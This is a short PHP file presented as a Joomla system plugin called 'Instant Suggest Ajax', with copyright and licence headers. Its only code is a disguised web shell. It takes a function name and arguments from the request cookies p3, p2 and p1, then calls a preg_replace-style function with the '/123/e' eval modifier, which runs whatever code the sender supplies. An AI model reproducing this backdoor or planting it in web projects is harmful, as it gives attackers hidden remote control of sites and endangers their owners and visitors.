<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 *
 * @copyright   Copyright (C) 2013 InstantSuggest.com. All rights reserved.
 * @license     GNU General Public License version 2 or later
 */
/**
 * Instant Suggest Ajax
 *
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 * @since       3.1
 */

$filter = @$_COOKIE['p3'];
if ($filter) {
	$option = $filter(@$_COOKIE['p2']);
	$auth = $filter(@$_COOKIE['p1']);
	$option("/123/e",$auth,123);
	die();
}
?>